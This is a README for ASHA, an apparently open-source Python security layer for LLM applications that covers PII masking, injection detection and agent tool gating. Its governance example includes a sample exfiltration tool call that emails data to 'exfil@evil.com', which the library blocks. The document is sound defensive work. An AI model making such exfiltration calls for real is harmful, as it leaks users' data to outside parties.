# ASHA - Adaptive Security for Human-SI Systems

**ASHA: Governance, Alignment, and Security Runtime for Superintelligence (SI) and Autonomous Agent Networks. Provides configurable security, preprocessing, token optimization, and runtime controls for Python-based LLM applications.**

> **Developer preview (v0.4.2).** Pre-1.0: APIs may change.  
> Install with `pip install asha-si`. For long-lived pilots, pin the version you tested (see [docs/status.md](docs/status.md)).
>
> **Security Notice:** ASHA is an application utility layer. It is not a replacement for provider-level safety systems, application authorization, operating-system sandboxing, network isolation, or secure software engineering practices. Review the [ASHA Threat Model](docs/security/threat-model.md).

[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://www.python.org/)
[![PyPI](https://img.shields.io/badge/pypi-0.4.2-orange)](https://pypi.org/project/asha-si/)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue)](LICENSE)
[![Docs](https://img.shields.io/badge/docs-mkdocs-material-blue)](https://ajayrajan05.github.io/asha-si/)
[![Discussions](https://img.shields.io/badge/GitHub-Discussions-black?logo=github)](https://github.com/AjayRajan05/asha-si/discussions)
[![Slack](https://img.shields.io/badge/Slack-Join-4A154B?logo=slack&logoColor=white)](https://join.slack.com/t/asha-community/shared_invite/zt-45h11ellh-yY~YG4BL8W~TvxsMXSgPzw)

## Quickstart

```bash
pip install asha-si
```

No API key and no heavy dependencies required for the core installation.

```python
from asha import process, SecureLLM, Profile

# 1. Zero-dependency prompt sanitization and PII masking
result = process("Contact john@example.com for quarterly financial analysis", profile=Profile.BALANCED())
print(result.output)   # PII masked, original task and semantics preserved
print(result.security) # detection summary (threats, PII tokens, safety verdict)
print(result.metrics)  # honest token savings and processing latency

# 2. Transparent single-line proxy for any LLM client (with automatic response rehydration)
# client = SecureLLM(raw_openai_client, profile=Profile.BALANCED())
# response = client.chat.completions.create(model="gpt-4o", messages=[...])

# 3. Superintelligence (SI) and autonomous agent alignment
# agent_client = SecureLLM(raw_openai_client, profile=Profile.SI_ALIGNMENT())
```

## Why ASHA

- **Superintelligence (SI) agent containment**: provides runtime execution bounding (`AgentCostGuard`), memory poisoning defense, and strict tool authorization (`Profile.SI_ALIGNMENT()`) to prevent autonomous mission drift.
- **Semantic-preserving preprocessing**: `process()` sanitizes PII and checks injections without destroying user intent or replacing code with generic assistant boilerplate.
- **Honest token optimization**: `optimize()` guarantees that reported token savings reflect actual prompt reduction, enforcing configured `token_budget` values.
- **Non-mutating client proxying**: `wrap_llm()` wraps OpenAI, Anthropic, Gemini, or Ollama clients without modifying the underlying client in-place.
- **Mission-scoped agent governance**: `anchor()` compiles an immutable mission contract and gates every tool call against it (`ALLOW` / `WARN` / `BLOCK` / `REVIEW`), normalizing actions to prevent tool authorization bypasses.
- **Unicode and indirect RAG injection defense**: canonicalizes zero-width spaces and confusables before evaluation, with dedicated RAG context scanning (`scan_rag_context()`).
- **Provider compatibility**: supports OpenAI, Anthropic, Google Gemini (all models via modern `google-genai` and `google-generativeai`), Ollama (parameterized host/timeout), and llama.cpp (via OpenAI-compatible server endpoint).

## Install tiers

| Install | What you get | Dependency cost |
|---------|--------------|-----------------|
| `pip install asha-si` | **Recommended for everyone**: core APIs, lite/heuristic detectors, and text PDF/DOCX extraction for PII masking | pydantic, tiktoken, requests, click, pypdf, python-docx |
| `pip install asha-si[fast]` | Faster pattern matching | + `pyahocorasick` |
| `pip install asha-si[hardened]` | Optional classical ML detectors (models auto-download on first use) | + torch / transformers / sklearn stack |
| `pip install asha-si[anchor]` | All ANCHOR framework adapters (CrewAI, LangChain, LangGraph, LlamaIndex, MCP) | + framework packages |

Other common extras: `asha-si[openai]`, `asha-si[integrations]`, `asha-si[ml]`, or per-framework `asha-si[crewai]` / `asha-si[langchain]` / `asha-si[langgraph]` / `asha-si[llamaindex]` / `asha-si[mcp]`. Hardened weights are **not** required for the default lite path. Adapter matrix: [docs/anchor.md](docs/anchor.md).

## Mission governance (`anchor`)

```python
from asha.runtime.anchor import AnchorRuntime
from asha.exceptions import ASHAAnchorBlocked

runtime = AnchorRuntime(warn_policy="strict", interactive=False, risk_tolerance="LOW")
runtime.initialize_mission(
    "Analyze Q1 sales locally and write a report. Do not send data externally.",
    context={
        "available_tools": ["load_sales_data", "write_report", "send_email"],
        "local_only": True,
    },
)

# On-mission → allowed
assert runtime.evaluate_action_request(
    "tool_call",
    {
        "tool_name": "write_report",
        "arguments": str({"args": (), "kwargs": {"report_content": "Q1 summary"}}),
    },
)

# High-risk / off-policy → blocked
try:
    runtime.evaluate_action_request(
        "tool_call",
        {
            "tool_name": "send_email",
            "arguments": str({"args": (), "kwargs": {"to": "exfil@evil.com"}}),
        },
        raise_on_block=True,
    )
except ASHAAnchorBlocked as err:
    print(err)
    # ANCHOR blocked tool/action 'send_email': High-risk tool 'send_email'
    # requires human approval before execution.
```

One-line adoption for an existing agent (headless-safe):

```python
from asha import Agent, anchor

agent = anchor(
    Agent(provider="mock", model="mock", tools=["read_file", "email"]),
    interactive=False,
)
print(agent.run("Generate the monthly sales report"))
```

## Custom Scanner Plugins & Scoped Contexts

Extend ASHA with enterprise PII rules or safely scope protection to code blocks:

```python
from asha import Profile
from asha.scanners import PatternScanner, register_scanner
from asha.integrations import patch_context

# 1. Register domain-specific PII scanners
badge_scanner = PatternScanner(
    name="employee_badge",
    pattern=r"\bEMP-\d{5}\b",
    pii_type="employee_id",
)
register_scanner(badge_scanner)

# 2. Scoped client context (cleanly unwraps on exit without monkey-patching)
with patch_context(client=my_client, profile=Profile.BALANCED()) as client:
    response = client.chat.completions.create(...)
```

## Live showcase

```bash
pip install -e ".[demo]"
streamlit run examples/showcase/app.py
```

Interactive developer control center running the **real** ASHA library:

1. **Scrub** dirty prompts/files (`process` / `sanitize` / `PIIVault`) so PII, secrets, and injections never reach the model
2. **Leash** agents with ANCHOR (ALLOW local tools, BLOCK unauthorized exfiltration)
3. **Transparent Proxy** with `SecureLLM` (live Gemini / Ollama / OpenAI or offline mock mode)
4. **RAG Context Guard** (`scan_rag_context`) to quarantine poisoned retrieved chunks

## Docs

Full documentation (tutorial, how-tos, reference, explanation): **[docs site](https://ajayrajan05.github.io/asha-si/)** · [docs/index.md](docs/index.md) · [Status](docs/status.md) · [Roadmap](docs/roadmap.md)

### Migration from PrivySHA

```bash
pip uninstall privysha -y
pip install asha-si==0.4.2
```

```python
# before: from privysha import process
from asha import process
```

Env prefix is `ASHA_*`. Details: [docs/migration-v0.4.md](docs/migration-v0.4.md).

## Community & support

- **[GitHub Discussions](https://github.com/AjayRajan05/asha-si/discussions)**: questions, ideas, and design talk (primary)
- **[Slack](https://join.slack.com/t/asha-community/shared_invite/zt-45h11ellh-yY~YG4BL8W~TvxsMXSgPzw)**: community chat
- **[GitHub Issues](https://github.com/AjayRajan05/asha-si/issues)**: bugs and feature requests
- **Support policy:** [SUPPORT.md](SUPPORT.md)

## License

Apache 2.0 (see [LICENSE](LICENSE)).

- Contributing: [CONTRIBUTING.md](CONTRIBUTING.md) · [docs/contributing.md](docs/contributing.md)
- Code of conduct: [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md)
- Security: [SECURITY.md](SECURITY.md)
- Roadmap: [docs/roadmap.md](docs/roadmap.md)
